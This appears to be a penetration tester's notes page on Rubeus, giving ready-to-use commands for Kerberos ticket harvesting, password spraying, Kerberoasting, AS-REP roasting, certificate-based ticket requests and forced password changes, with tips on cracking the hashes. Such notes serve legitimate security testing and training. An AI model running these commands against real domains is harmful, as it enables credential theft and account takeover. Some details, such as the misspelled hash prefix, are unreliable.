# Using Rubeus

Rubeus is a Windows-only post-exploitation tool for attacking Kerberos. No compiled binaries are available (either through the GitHub repo or Kali Linux's `windows-binaries` package).

NOTE: To use Rebueus you need to already be on the domain you are attacking, or alternately need to have mapped the domain controller (which normally hosts the KDC) IP address properly in C:/Windows/System32/drivers/etc/hosts.

* [Rubeus](https://github.com/GhostPack/Rubeus)
* [Kerberos](./Kerberos.md)

## Harvest Kerberos Tickets

```powershell
# Harvest ticket granting tickets observed by the current machine.
# Probably works best when run on a domain controller.
#
Rubeus.exe harvest /interval:30
```

## Password Spraying

```powershell
# Spray the specified password across all known users and generate a
# ticket giving ticket for successful authentications. (Can trigger
# account lockouts!)
#
Rubeus.exe brute /password:ThePasswordToSpray /noticket
```

## Kerberoasting

```powershell
# Extract password hashes for all known kerberoastable accounts using
# Rubeus.
#
Rubeus.exe kerberoast
```

The password hashes output here can then be cracked with Hashcat (use the 13100 hash mode).

* [Using Hashcat](./Using%20Hashcat.md)

## AS-REP Roasting

```powershell
# AS-REP roasting with Rubeus.
#
Rubeus.exe asreproast
```

To use Hashcat to crack the hashes obtained in this fashin, first insert `23$` after the leading `$kerb5asrep$` (so `$kerb5asrep$` → `$kerb5asrep$23$`) and then use mode 18200.

## Using a Certificate to Request a Ticket

```powershell
# Request a ticket using a certificate from AD CS.
#
Rubeus.exe asktgt /user:$USER `
                  /enctype:aes256 `
                  /certificate:$CERTIFICATE_FILE `
                  /password:$CERTIFICATE_FILE_PASSWORD `
                  /outfile:$TICKET_FILE `
                  /domain:$DOMAIN `
                  /dc:$DC_IP_ADDRESS
```

This is very useful if we've used an AD CS misconfiguration as described by SpectreOps' "Certified Pre-Owned" research to forge a certificate that's valid for another user.

* [SpectreOps: Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)

## Change a User's Password

```powershell
# We can use Rubeus to change the password for domain users so long as
# our ticket is for a user with permission to do so (generally the user
# themselves or a domain admin.
#
Rubeus.exe changepw /ticket:$TICKET_FILE `
                    /new:$NEW_PASSWORD `
                    /dc:$DC_IP_ADDRESS `
                    /targetuser:$DOMAIN\$USER
```
